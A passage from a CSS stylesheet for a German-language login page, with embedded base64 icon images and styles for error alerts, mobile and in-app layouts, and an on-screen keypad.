Yx+Wv9gsWAYAwNL9jGzvut1W+ktYISP9XkEmE7V9SfUNOXLR1fSRYrahhEt4KV2Uv1nJ0QLGien7E0AnkO0IVBc3iSafQLNGJXTedIQddOA9nOoDHXDBiFafYKIm9XCZSOEdRMDX1KHP27nmJs2XnGjyG5/9hVfDKOrF5Mc/lfDsY0+AJo3fbnWPf+pqTtUBPi+wBiK3fOCHYcJVD1mwhklFSOKgvqv+7FG0z1RH8SjNkfUVcOFPqQEUXAVwZtuCWfbc3df8ZsAMAgYJ8oWgrrWhSAiHJNAN9CPYeOTxP/6gwNmhfTOnMCdmJITYWfKP+1bIow+s8KxwQLP8izAOK6ZFKry9vOS2YyxTXcDlEne1+axunQMbK+D07RclJiPQqD5f8FGABmtv4JiRaZKgAAAABJRU5ErkJggg==);
    background-image: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhLS0gR2VuZXJhdG9yOiBBZG9iZSBJbGx1c3RyYXRvciAxNS4xLjAsIFNWRyBFeHBvcnQgUGx1Zy1JbiAuIFNWRyBWZXJzaW9uOiA2LjAwIEJ1aWxkIDApICAtLT4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkViZW5lXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iMTYyLjYyN3B4IiBoZWlnaHQ9IjI3LjEyNXB4IiB2aWV3Qm94PSIwIDAgMTYyLjYyNyAyNy4xMjUiIGVuYWJsZS1iYWNrZ3JvdW5kPSJuZXcgMCAwIDE2Mi42MjcgMjcuMTI1Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xNy4yMzcsMTcuMTc2Yy0yLjI5NS0wLjk3NC0yLjgzOS0xLjMxMy0yLjgzOS0xLjMxM2wtMC4wMjEtMi4yNGMwLDAsMC44Ni0wLjY3MywxLjEyNy0yLjc4Mg0KCWMwLjUzNywwLjE1OSwxLjEwMy0wLjgxNiwxLjEzMy0xLjMzYzAuMDI5LTAuNDk1LTAuMDc0LTEuODY4LTAuNzMtMS43M2MwLjEzNC0xLjAzNCwwLjIzMS0xLjk2NCwwLjE4NC0yLjQ1Ng0KCWMtMC4xNzEtMS44MDEtMS45MTEtMy42OTktNC41ODktMy42OTljLTIuNjc4LDAtNC40MjEsMS44OTctNC41OTIsMy42OThDNi44NjMsNS44MTYsNi45NjEsNi43NDYsNy4wOTUsNy43OA0KCWMtMC42NTYtMC4xMzgtMC43NiwxLjIzNS0wLjczLDEuNzNjMC4wMzEsMC41MTQsMC41OTQsMS40ODksMS4xMzMsMS4zM2MwLjI2NywyLjEwOSwxLjEyNywyLjc4MiwxLjEyNywyLjc4MmwtMC4wMjEsMi4yNDENCgljMCwwLTAuNTQ1LDAuMzM4LTIuODM5LDEuMzEyYy0yLjI5NiwwLjk3NC00LjYxNCwxLjY1NC01LjMwNCwyLjc1Yy0wLjYxOSwwLjk4MS0wLjQzNCw1LjY5OS0wLjQzNCw1LjY5OWgyMi45NDgNCgljMCwwLDAuMTg2LTQuNzE4LTAuNDM0LTUuNjk5QzIxLjg1MSwxOC44MywxOS41MzIsMTguMTQ4LDE3LjIzNywxNy4xNzZ6Ii8+DQo8Zz4NCgk8cGF0aCBmaWxsPSJub25lIiBkPSJNNDMuMjUsMTUuNWMtMS4zNDgsMC0yLjQzOCwxLjAwOC0yLjQzOCwyLjI1YzAsMC44MzIsMC40OTIsMS41NTksMS4yMiwxLjk0N3YyLjU1M2gyLjQzN3YtMi41NTMNCgkJYzAuNzI5LTAuMzkxLDEuMjE5LTEuMTE1LDEuMjE5LTEuOTQ3QzQ1LjY4OCwxNi41MDgsNDQuNTk2LDE1LjUsNDMuMjUsMTUuNXoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMzYuNzUsNy42MjV2M2gzLjI0OXYtM2MwLjAwMy0wLjc3MiwwLjMxMy0xLjUzMiwwLjk1Mi0yLjEyMWMwLjY0LTAuNTg5LDEuNDYxLTAuODc3LDIuMjk5LTAuODc5DQoJCWMwLjgzNiwwLjAwMiwxLjY1OSwwLjI5LDIuMjk5LDAuODc5YzAuNjM3LDAuNTg5LDAuOTQ4LDEuMzQ5LDAuOTUxLDIuMTIxdjNoMy4yNDl2LTNjMC4wMDItMS41My0wLjYzOC0zLjA3NS0xLjkwMy00LjI0Mg0KCQljLTEuMjY1LTEuMTY5LTIuOTM4LTEuNzYxLTQuNTk2LTEuNzU4Yy0xLjY1OS0wLjAwMy0zLjMzMiwwLjU4OS00LjU5OCwxLjc1OEMzNy4zODcsNC41NSwzNi43NDcsNi4wOTUsMzYuNzUsNy42MjV6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTUyLjk5OSwyNC4xMjV2LTEwLjVjMC0wLjM4NC0wLjE1OC0wLjc2OC0wLjQ3Ni0xLjA2MXMtMC43MzItMC40MzktMS4xNDgtMC40MzlIMzUuMTI0DQoJCWMtMC40MTYsMC0wLjgzMSwwLjE0Ni0xLjE0OSwwLjQzOWMtMC4zMTUsMC4yOTMtMC40NzUsMC42NzctMC40NzUsMS4wNjF2MTAuNWMwLDAuMzg0LDAuMTU4LDAuNzY4LDAuNDc1LDEuMDYxDQoJCWMwLjMxOCwwLjI5MywwLjczMywwLjQzOSwxLjE0OSwwLjQzOWgxNi4yNTFjMC40MTYsMCwwLjgzMS0wLjE0NiwxLjE0OC0wLjQzOVM1Mi45OTksMjQuNTA5LDUyLjk5OSwyNC4xMjV6IE00NC40NjgsMTkuNjk3djIuNTUzDQoJCWgtMi40Mzd2LTIuNTUzYy0wLjcyOS0wLjM5MS0xLjIyMS0xLjExNS0xLjIyMS0xLjk0N2MwLTEuMjQyLDEuMDkyLTIuMjUsMi40MzgtMi4yNXMyLjQzNywxLjAwOCwyLjQzNywyLjI1DQoJCUM0NS42ODgsMTguNTgyLDQ1LjE5NSwxOS4zMDksNDQuNDY4LDE5LjY5N3oiLz4NCjwvZz4NCjxwYXRoIGZpbGw9IiNDQzAwMDAiIGQ9Ik0xNjIuNDk2LDI2LjE1OWwtNy44MTctMTMuNjM3Yy0wLjMwMy0wLjUzLTAuODAxLTAuNTMtMS4xMDUsMGwtNy44MTgsMTMuNjM3DQoJYy0wLjMwMywwLjUzLTAuMDUsMC45NjYsMC41NjMsMC45NjZoMTUuNjE5QzE2Mi41NSwyNy4xMjUsMTYyLjgwNCwyNi42ODksMTYyLjQ5NiwyNi4xNTkgTTE1My40MzEsMTYuMDU3aDEuMzk0DQoJYzAuNDIsMCwwLjQ3OSwwLjI0MywwLjQ3OSwwLjM4OWwtMC4wMDQsMC4xMjdsLTAuMDEsMC4xNDZsLTAuMjg2LDUuMDljLTAuMDQyLDAuMzgxLTAuMjExLDAuNDU3LTAuNDkxLDAuNDU3aC0wLjc0Mg0KCWMtMC4yODEsMC0wLjQ1My0wLjA3Ni0wLjQ5NC0wLjQ2N2wtMC4yODUtNS4wOGwtMC4wMTItMC4xNDZsLTAuMDA0LTAuMTI3QzE1Mi45NzYsMTYuMywxNTMuMDM1LDE2LjA1NywxNTMuNDMxLDE2LjA1Nw0KCSBNMTU0LjE0NiwyNS44MzdjLTAuNzMxLDAtMS4zMjYtMC41ODktMS4zMjYtMS4zMTJjMC0wLjc0MiwwLjU4Mi0xLjMyMywxLjMyNi0xLjMyM2MwLjcyNywwLDEuMzE1LDAuNTk0LDEuMzE1LDEuMzIzDQoJQzE1NS40NjIsMjUuMjM0LDE1NC44NTgsMjUuODM3LDE1NC4xNDYsMjUuODM3Ii8+DQo8cGF0aCBmaWxsPSIjMDA0OTdCIiBkPSJNNzQuNjg2LDIuMTQyYy02LjM0OCwwLTExLjQ5LDUuMTQyLTExLjQ5LDExLjQ5YzAsNi4zNDcsNS4xNDQsMTEuNDg5LDExLjQ5LDExLjQ4OQ0KCWM2LjM0NiwwLDExLjQ4OS01LjE0MywxMS40ODktMTEuNDg5Qzg2LjE3NSw3LjI4NCw4MS4wMzEsMi4xNDIsNzQuNjg2LDIuMTQyeiBNNzcuNDk1LDIwLjc3bC0wLjExNiwwLjA0NQ0KCWMtMC42ODgsMC4yNzEtMS4yMzQsMC40NzgtMS42NDYsMC42MTljLTAuNDMzLDAuMTUtMC45MzcsMC4yMjgtMS40OTgsMC4yMjhjLTAuODgzLDAtMS41ODgtMC4yMjQtMi4wOS0wLjY2Ng0KCWMtMC41MTMtMC40NTEtMC43NzEtMS4wMjktMC43NzEtMS43MjJjMC0wLjI1MiwwLjAxOC0wLjUxLDAuMDU1LTAuNzcyYzAuMDM1LTAuMjU4LDAuMDkyLTAuNTQ5LDAuMTctMC44NzdsMC44NTYtMy4wMzMNCgljMC4wNzMtMC4yOCwwLjEzNy0wLjU1MSwwLjE4OC0wLjgwNmMwLjA0OS0wLjI0MiwwLjA3Mi0wLjQ2NiwwLjA3Mi0wLjY2YzAtMC4zMTItMC4wNTYtMC41My0wLjE2Mi0wLjYzNA0KCWMtMC4wNjQtMC4wNi0wLjI0NC0wLjE2LTAuNzQ4LTAuMTZjLTAuMTk3LDAtMC4zOTgsMC4wMzEtMC42MTEsMC4wOTRjLTAuMjI3LDAuMDY2LTAuNDIsMC4xMzEtMC41OCwwLjE5bC0wLjQzLDAuMTZsMC4zNjUtMS40OTYNCglsMC4xMTUtMC4wNDZjMC41NTQtMC4yMjYsMS4xMDItMC40MjUsMS42MjQtMC41OTFjMS41MTUtMC40NzksMi44MzYtMC4yNzEsMy41ODgsMC40MDFjMC40OTksMC40NDUsMC43NTIsMS4wMjcsMC43NTIsMS43MjkNCgljMCwwLjEzNi0wLjAxOSwwLjM3NC0wLjA0NywwLjcxN2MtMC4wMzMsMC4zNDItMC4wOTUsMC42NjQtMC4xODMsMC45NThsLTAuODUxLDMuMDFjLTAuMDY5LDAuMjM2LTAuMTI5LDAuNTA0LTAuMTgzLDAuODA1DQoJYy0wLjA1MSwwLjI5My0wLjA3NywwLjUxMi0wLjA3NywwLjY2MmMwLDAuMzE2LDAuMDYyLDAuNTM1LDAuMTc5LDAuNjMxYzAuMDkyLDAuMDc0LDAuMzAxLDAuMTYyLDAuNzc3LDAuMTYyDQoJYzAuMTg2LDAsMC4zOTgtMC4wMzMsMC42MzgtMC4xYzAuMjQ0LTAuMDY2LDAuNDIxLTAuMTI1LDAuNTI4LTAuMTc4bDAuNDYzLTAuMjIxTDc3LjQ5NSwyMC43N3ogTTc3LjMwNSw4LjUzMQ0KCWMtMC40MzgsMC40MS0wLjk3OSwwLjYxOS0xLjYsMC42MTljLTAuNjE5LDAtMS4xNTktMC4yMDgtMS42MDQtMC42MTljLTAuNDQ5LTAuNDE1LTAuNjc5LTAuOTI2LTAuNjc5LTEuNTE4DQoJYzAtMC41OTIsMC4yMjgtMS4xMDQsMC42NzctMS41MjRjMC44OTMtMC44MjksMi4zMjEtMC44MjgsMy4yMDUsMGMwLjQ0NiwwLjQxOSwwLjY3NCwwLjkzMSwwLjY3NCwxLjUyMw0KCUM3Ny45NzksNy42MDUsNzcuNzUyLDguMTE2LDc3LjMwNSw4LjUzMXoiLz4NCjxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik05NS40MDMsMTMuNzgyYy0zLjEzMiwwLTUuNjcxLDIuNTM4LTUuNjcxLDUuNjcyYzAsMy4xMzUsMi41MzksNS42NzMsNS42NzEsNS42NzMNCgljMy4xMzQsMCw1LjY3My0yLjUzOCw1LjY3My01LjY3M0MxMDEuMDc2LDE2LjMyLDk4LjUzNywxMy43ODIsOTUuNDAzLDEzLjc4MnogTTk1LjYxNywyMi43NjVjLTAuMTg3LDAuMTc3LTAuNDAzLDAuMjY1LTAuNjUyLDAuMjY1DQoJYy0wLjI1MywwLTAuNDcyLTAuMDg4LTAuNjU3LTAuMjY1Yy0wLjE4Ni0wLjE3Ni0wLjI3OS0wLjM4OC0wLjI3OS0wLjYzM2MwLTAuMjQ2LDAuMDk0LTAuNDU5LDAuMjc5LTAuNjM4DQoJYzAuMTg2LTAuMTgsMC40MDQtMC4yNywwLjY1Ny0wLjI3YzAuMjQ5LDAsMC40NjYsMC4wOSwwLjY1MiwwLjI3YzAuMTg3LDAuMTc5LDAuMjc5LDAuMzkyLDAuMjc5LDAuNjM4DQoJQzk1Ljg5NiwyMi4zNzcsOTUuODA0LDIyLjU4OSw5NS42MTcsMjIuNzY1eiBNOTYuOTczLDE5LjQzOWMtMC40NDYsMC40MDQtMS4wNDEsMC42MzUtMS43ODUsMC42OTNsLTAuMDI4LDAuNjZoLTAuNDMydi0xLjg4Nw0KCWMwLjQ2OC0wLjAzOSwwLjgzNS0wLjE4NywxLjEwMS0wLjQ0NGMwLjI2Ni0wLjI1NywwLjM5OC0wLjYwNiwwLjM5OC0xLjA1MWMwLTAuMzUyLTAuMDk0LTAuNjM0LTAuMjc5LTAuODQ1DQoJYy0wLjE4Ni0wLjIxMy0wLjQzNi0wLjMxOC0wLjc1LTAuMzE4Yy0wLjEzMywwLTAuMjUsMC4wMTQtMC4zNTQsMC4wNDFjLTAuMTAzLDAuMDI3LTAuMjAzLDAuMDctMC4zLDAuMTI4DQoJYzAuMDMxLDAuMTA0LDAuMDcsMC4yMzcsMC4xMTMsMC40MDFjMC4wNDQsMC4xNjMsMC4wNjYsMC4zMTMsMC4wNjYsMC40NTNjMCwwLjIyNi0wLjA3NCwwLjQwMS0wLjIyMSwwLjUyNg0KCWMtMC4xNDcsMC4xMjQtMC4zNTMsMC4xODctMC42MTQsMC4xODdjLTAuMjQ1LDAtMC40MzgtMC4wNzctMC41OC0wLjIzM2MtMC4xNDEtMC4xNTUtMC4yMTEtMC4zNDYtMC4yMTEtMC41NzINCgljMC0wLjM3MSwwLjIxMi0wLjY4NywwLjYzNi0wLjk0NXMwLjkzNi0wLjM4OCwxLjUzMy0wLjM4OGMwLjcwOSwwLDEuMjgxLDAuMTg0LDEuNzIsMC41NTNjMC40MzgsMC4zNjksMC42NTcsMC44NTQsMC42NTcsMS40Ng0KCUM5Ny42NDMsMTguNTA4LDk3LjQxOSwxOS4wMzYsOTYuOTczLDE5LjQzOXoiLz4NCjxnPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMTAuMTY3LDE2LjIwMmgtMC44OTRjLTAuMjQ2LDAtMC40NDYsMC4yMDEtMC40NDYsMC40NDd2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTQNCgkJYzAuMjQ2LDAsMC40NDgtMC4yMDEsMC40NDgtMC40NDd2LTAuODk1QzExMC42MTUsMTYuNDAzLDExMC40MTMsMTYuMjAyLDExMC4xNjcsMTYuMjAyeiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMTEuODA3LDE3Ljk5MWgwLjg5NGMwLjI0NywwLDAuNDQ3LTAuMjAxLDAuNDQ3LTAuNDQ3di0wLjg5NWMwLTAuMjQ2LTAuMi0wLjQ0Ny0wLjQ0Ny0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMS4zNTksMTcuNzksMTExLjU2MSwxNy45OTEsMTExLjgwNywxNy45OTF6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNC4zNCwxNy45OTFoMC44OTRjMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVjMC0wLjI0Ni0wLjIwMi0wLjQ0Ny0wLjQ0OC0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMy44OTMsMTcuNzksMTE0LjA5NCwxNy45OTEsMTE0LjM0LDE3Ljk5MXoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTE3Ljc2NywxNi4yMDJoLTAuODk0Yy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1YzAsMC4yNDYsMC4yMDEsMC40NDcsMC40NDcsMC40NDdoMC44OTQNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzExOC4yMTQsMTYuNDAzLDExOC4wMTMsMTYuMjAyLDExNy43NjcsMTYuMjAyeiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMjAuMzAxLDE2LjIwMmgtMC44OTVjLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDd2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ni0wLjIwMSwwLjQ0Ni0wLjQ0N3YtMC44OTVDMTIwLjc0NywxNi40MDMsMTIwLjU0NywxNi4yMDIsMTIwLjMwMSwxNi4yMDJ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMi44MzMsMTYuMjAyaC0wLjg5NWMtMC4yNDYsMC0wLjQ0NiwwLjIwMS0wLjQ0NiwwLjQ0N3YwLjg5NWMwLDAuMjQ2LDAuMiwwLjQ0NywwLjQ0NiwwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ny0wLjIwMSwwLjQ0Ny0wLjQ0N3YtMC44OTVDMTIzLjI4LDE2LjQwMywxMjMuMDc5LDE2LjIwMiwxMjIuODMzLDE2LjIwMnoiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTEwLjE2NywxOC43MzZoLTAuODk0Yy0wLjI0NiwwLTAuNDQ2LDAuMi0wLjQ0NiwwLjQ0NnYwLjg5NWMwLDAuMjQ2LDAuMiwwLjQ0NywwLjQ0NiwwLjQ0N2gwLjg5NA0KCQljMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVDMTEwLjYxNSwxOC45MzcsMTEwLjQxMywxOC43MzYsMTEwLjE2NywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExMS44MDcsMjAuNTI0aDAuODk0YzAuMjQ3LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1YzAtMC4yNDYtMC4yLTAuNDQ3LTAuNDQ3LTAuNDQ3aC0wLjg5NA0KCQljLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDd2MC44OTVDMTExLjM1OSwyMC4zMjMsMTExLjU2MSwyMC41MjQsMTExLjgwNywyMC41MjR6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNC4zNCwyMC41MjRoMC44OTRjMC4yNDYsMCwwLjQ0OC0wLjIwMSwwLjQ0OC0wLjQ0N3YtMC44OTVjMC0wLjI0Ni0wLjIwMi0wLjQ0Ny0wLjQ0OC0wLjQ0N2gtMC44OTQNCgkJYy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ3djAuODk1QzExMy44OTMsMjAuMzIzLDExNC4wOTQsMjAuNTI0LDExNC4zNCwyMC41MjR6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNy43NjcsMTguNzM2aC0wLjg5NGMtMC4yNDYsMC0wLjQ0NywwLjItMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NA0KCQljMC4yNDYsMCwwLjQ0Ny0wLjIwMSwwLjQ0Ny0wLjQ0N3YtMC44OTVDMTE4LjIxNCwxOC45MzcsMTE4LjAxMywxOC43MzYsMTE3Ljc2NywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMC4zMDEsMTguNzM2aC0wLjg5NWMtMC4yNDYsMC0wLjQ0NywwLjItMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2gwLjg5NQ0KCQljMC4yNDYsMCwwLjQ0Ni0wLjIwMSwwLjQ0Ni0wLjQ0N3YtMC44OTVDMTIwLjc0NywxOC45MzcsMTIwLjU0NywxOC43MzYsMTIwLjMwMSwxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMi44MzMsMTguNzM2aC0wLjg5NWMtMC4yNDYsMC0wLjQ0NiwwLjItMC40NDYsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzEyMy4yOCwxOC45MzcsMTIzLjA3OSwxOC43MzYsMTIyLjgzMywxOC43MzZ6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExMC4xNjcsMjEuMjdoLTAuODk0Yy0wLjI0NiwwLTAuNDQ2LDAuMjAxLTAuNDQ2LDAuNDQ2djAuODk1YzAsMC4yNDYsMC4yLDAuNDQ3LDAuNDQ2LDAuNDQ3aDAuODk0DQoJCWMwLjI0NiwwLDAuNDQ4LTAuMjAxLDAuNDQ4LTAuNDQ3di0wLjg5NUMxMTAuNjE1LDIxLjQ3MSwxMTAuNDEzLDIxLjI3LDExMC4xNjcsMjEuMjd6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTExNy43NjcsMjEuMjdoLTUuOTZjLTAuMjQ2LDAtMC40NDcsMC4yMDEtMC40NDcsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIwMSwwLjQ0NywwLjQ0NywwLjQ0N2g1Ljk2DQoJCWMwLjI0NiwwLDAuNDQ3LTAuMjAxLDAuNDQ3LTAuNDQ3di0wLjg5NUMxMTguMjE0LDIxLjQ3MSwxMTguMDEzLDIxLjI3LDExNy43NjcsMjEuMjd6Ii8+DQoJPHBhdGggZmlsbD0iI0NDRDdFMSIgZD0iTTEyMC4zMDEsMjEuMjdoLTAuODk1Yy0wLjI0NiwwLTAuNDQ3LDAuMjAxLTAuNDQ3LDAuNDQ2djAuODk1YzAsMC4yNDYsMC4yMDEsMC40NDcsMC40NDcsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDYtMC4yMDEsMC40NDYtMC40NDd2LTAuODk1QzEyMC43NDcsMjEuNDcxLDEyMC41NDcsMjEuMjcsMTIwLjMwMSwyMS4yN3oiLz4NCgk8cGF0aCBmaWxsPSIjQ0NEN0UxIiBkPSJNMTIyLjgzMywyMS4yN2gtMC44OTVjLTAuMjQ2LDAtMC40NDYsMC4yMDEtMC40NDYsMC40NDZ2MC44OTVjMCwwLjI0NiwwLjIsMC40NDcsMC40NDYsMC40NDdoMC44OTUNCgkJYzAuMjQ2LDAsMC40NDctMC4yMDEsMC40NDctMC40NDd2LTAuODk1QzEyMy4yOCwyMS40NzEsMTIzLjA3OSwyMS4yNywxMjIuODMzLDIxLjI3eiIvPg0KCTxwYXRoIGZpbGw9IiNDQ0Q3RTEiIGQ9Ik0xMjMuNTg1LDE0LjA3aC0xNS4wNjNjLTEuMjksMC0yLjMzOSwxLjA0OS0yLjMzOSwyLjM0djYuNDM5YzAsMS4yOSwxLjA0OSwyLjM0MSwyLjMzOSwyLjM0MWgxNS4wNjMNCgkJYzEuMjksMCwyLjMzOS0xLjA1MSwyLjMzOS0yLjM0MVYxNi40MUMxMjUuOTI0LDE1LjExOSwxMjQuODc1LDE0LjA3LDEyMy41ODUsMTQuMDd6IE0xMjQuNTUsMTYuNTR2Ni4xOA0KCQljMCwwLjc0MS0wLjYwNCwxLjM0My0xLjM0NCwxLjM0M2gtMTQuMzA1Yy0wLjc0MSwwLTEuMzQ0LTAuNjAyLTEuMzQ0LTEuMzQzdi02LjE4YzAtMC43NCwwLjYwMy0xLjM0MywxLjM0NC0xLjM0M2gxNC4zMDUNCgkJQzEyMy45NDYsMTUuMTk3LDEyNC41NSwxNS44LDEyNC41NSwxNi41NHoiLz4NCjwvZz4NCjwvc3ZnPg0K); 
    background-position: bottom right;
    margin-right: 2px;
}
body.loginerror .commontext{padding-bottom:10px;}
/************************************************************************
* SONDERKLASSEN  Warnung/allgemeiner Fehler
************************************************************************/
body.alert .commonalert{
    display:block;
    color:#cc0000;
    padding:12px 0;
}
body.alert .commonalert *{
    color:inherit;
    font-weight:inherit;
}

div > .text *{
		color:inherit;
		font-weight:inherit;
}
/************************************************************************
* SONDERKLASSEN  No-Pass user hat keine Zugriff
************************************************************************/
body.noPass form,body.noPass .infotext, body.noPass .flipicon,body.noPass .col2 .links,body.noPass .whitebox-info, div.language form
{
    display:none
}

/************************************************************************
* SONDERKLASSEN  ismobile mobiles Gerät
************************************************************************/
body.ismobile .keyboard{display:none}
/************************************************************************
* general Styles for mobile devices
************************************************************************/
@media only screen and (max-width : 630px){
    body{min-width:315px;}
    div.wrapper{
        width:100%;
        padding:14px 20px;
        margin:10px auto 20px auto !important;
        }
    div.keyboard,div.col1.col > p {
        display:none;
        }
    a.openkeyboard.inInput:after{
        display:none !important;
    }    
    div.col{
         max-width:300px;
        width:100%;
        min-width:280px;
        margin:0 auto 16px auto;
        float:none;
        padding:0;
    }    
    div.col1.col > .text , body .product > p, .whitebox > h1{
        display:none;
        } 
    div.col1.col > p{
        display:block;
    }    
       
     .text.moved{
     padding-bottom:12px;
     }   
        
    /* Add "Login" after Productname */
    body .product > h2:after{
        content: ' Login';
        position:relative;
        }     
        
    div.col p,  div.col h2{
        text-align:center;
        padding: 0 0 12px 0;
        } 
     body.hasIcon .product{
        padding:0;
     }   
     body.hasIcon .producticon {
        display: block;
        width: 60px;
        height: 60px;
        position: relative;
        left: auto;
        margin: 0 auto 12px auto;
       }   
     div.product {
        border-top: none;
     }
     div.col1 > h1{
        display:none;
    } 
    h1.moved{
        background-position:center !important;
        width:100% !important;
        text-align:center;
    }
    .links {
       text-align:center;
    }
    div.product > h2{
        font-size:1.125rem;
        font-family: 'open_sanssemibold',Arial,sans-serif;
    }
    .text.moved + .commonalert.moved{
        padding-top:0;
        margin-top:-12px;
    }
    div.product > div.links{
    display:none;
    } 
    div.product{
    margin:0;
    } 
    div.language{
    position:absolute;
    top:10px;
    right:10px;
    }      
     div.isSmallScreen{
        display:block;
    }  
    div.number > input.input, div.password > input.input{
        width:82%;
    } 
    .center{
        margin:0 auto 0 auto;
        width:60%;
    }
    div.commonalert:not(.moved){display:none;}
    
    body.isApp .product p, body.isApp .language, body.isApp .infotext{
        display:none;
    }
    
}
 /************************************************************************
 * Keyboard styles
 ************************************************************************/  
  body.keyboardfile{
  background-color:#fff;
  padding:24px;
  }
 
 body.keyboardfile input[type=button],  body.keyboardfile input.keypadButton{
    width:35px !important;
    height:32px;
    background-color:#fff;
    border:solid 1px #cccccc;
    color:#00497b;
    border-radius:4px;
    margin:2px;
    font-size:16px;
    cursor:pointer;
 }
 
  body.keyboardfile input[type=button]:hover:not(.inverse){
    background-color:#ccc;
  }
  
   body.keyboardfile input[type=button]:active,  body.keyboardfile input.inverse{
    background-color:#00497b !important;
    color:#fff;
  }
 
 body.keyboardfile input.keypadButton2{
    width:115px !important;
    font-family: 'open_sansregular',Arial,sans-serif;
    font-size:11px;
    }
 
 body.keyboardfile input.keypadButtonErase, body.keyboardfile input.keypadButtonOK{
    width:75px !important;
    font-family: 'open_sansregular',Arial,sans-serif;
    font-size:11px;
 } 
 body.keyboardfile div.keypad{
    width:490px;
    float:left;
 }
 body.keyboardfile div.numpad{
    width:130px;
    float:left;
    margin-left:36px;
 }
 
  body.ielt10.keyboardfile div.numpad{
    width:130px;
    float:left;
    margin-left:36px;
 }
 
  body.keyboardfile div.clear{
  clear:left;
  }
 
  body.keyboardfile .functions{
  margin-top:16px !important;
  }
  
body.keyboardfile .centerbutton{
  margin:2px 2px 2px 46px !important;
  }
  
  
  body.keyboardfile input.keypadButtonOK{
   display:block;
  margin: 16px auto 2px auto !important;
  }
  /************************************************************************
     * inApp Styles for mobile devices
     ************************************************************************/    
    body.isApp .language,  body.isApp .infotext, body.isApp .text.moved{
        display:none;
    }
    body.isApp div.col2 >.whitebox,body.isApp div.col2 >.whitebox-info{
        height:250px;
    }
    body.isApp.loginerror .infotext{
        display:block;
    }
    body.isApp.loginerror div.col2 >.whitebox{
        height:300px;
    }
     body.isApp .wrapper{
    margin-bottom:0 !important;
    padding-bottom:6px;
    }
    body.isApp .openkeyboard{display:none !important;}
    body.isApp .keyboard{display:none;}
    body.isApp .col1 h1 + p{display:none;}  


/************************************************************************
* change Verfüger  - 26.8.2014
************************************************************************/  
span.changenumber{
    display:inline-block;
    z-index:1;
    position:absolute;
    right:20px;
    top:12px;
}
span.changenumber > a{
    display:inline-block;
    width:16px;
    height:16px;
    /*background-image:url(Remove.png);*/
